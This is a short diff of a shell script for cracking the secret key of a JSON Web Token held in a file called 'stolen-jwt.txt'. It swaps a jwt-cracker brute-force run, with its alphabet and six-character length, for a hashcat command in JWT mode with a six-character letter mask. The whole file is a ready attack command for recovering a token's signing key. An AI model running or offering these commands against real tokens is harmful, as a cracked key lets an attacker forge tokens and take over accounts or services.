@@ -1,6 +1,2 @@
 #!/bin/sh
-npm i -g jwt-cracker
-token=`cat stolen-jwt.txt`
-#alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-alphabet="abcdefghijklmnopqrstuvwxyz0123456789"
-jwt-cracker $token $alphabet 6
+hashcat -m 16500 stolen-jwt.txt -w3 -a3 -1?l?u ?1?1?1?1?1?1
